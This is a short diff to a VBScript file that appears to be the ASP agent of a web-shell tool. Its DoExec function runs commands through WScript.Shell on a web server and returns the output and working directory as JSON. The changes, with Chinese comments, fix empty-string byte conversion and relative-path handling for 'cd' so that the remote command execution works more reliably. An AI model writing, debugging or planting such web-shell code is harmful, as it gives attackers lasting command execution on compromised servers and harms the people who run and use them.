@@ -19,6 +19,12 @@ Function DecHex(hexStr, k)
 End Function
 Function StrToBytes(s)
   Dim i, arr
+  ' 空串必须返回零长度数组：ReDim arr(-1) 在 VBScript 中是运行时错误，
+  ' 会让"空输出命令"（true / mkdir / 空文件读取）整体失败
+  If Len(s) = 0 Then
+    StrToBytes = Array()
+    Exit Function
+  End If
   ReDim arr(Len(s) - 1)
   For i = 1 To Len(s)
     arr(i - 1) = Asc(Mid(s, i, 1))
@@ -28,6 +34,10 @@ End Function
 Function BytesToStr(arr)
   Dim i, s
   s = ""
+  If IsEmpty(arr) Then
+    BytesToStr = s
+    Exit Function
+  End If
   For i = 0 To UBound(arr)
     s = s & Chr(arr(i))
   Next
@@ -153,7 +163,7 @@ Function DoEnv()
 End Function
 Function DoExec(c, w)
   On Error Resume Next
-  Dim sh, p, outv, bytes, m, t
+  Dim sh, p, outv, bytes, m, t, fso
   If w <> "" Then
     Set sh = CreateObject("WScript.Shell")
     On Error Resume Next
@@ -164,7 +174,13 @@ Function DoExec(c, w)
     t = Trim(Mid(c, 3))
     If t <> "" Then
       Set fso = CreateObject("Scripting.FileSystemObject")
-      If Left(t, 1) <> "" And Left(t, 1) <> "/" Then t = w & "" & t
+      ' 相对路径拼到当前工作目录下：VBScript 无反斜杠转义，字面量就是 "\"；
+      ' 原实现写成空串（""），既不判反斜杠也不补分隔符 → cd sub 得到 C:\wwwsub
+      If Left(t, 1) <> "\" And Left(t, 1) <> "/" Then
+        If w <> "" Then
+          If Right(w, 1) <> "\" And Right(w, 1) <> "/" Then t = w & "\" & t Else t = w & t
+        End If
+      End If
       DoExec = "{""ok"":true,""data"":{""stdout"":"""",""cwd"":""" & EscJson(fso.GetAbsolutePathName(t)) & """}}"
       Exit Function
     End If
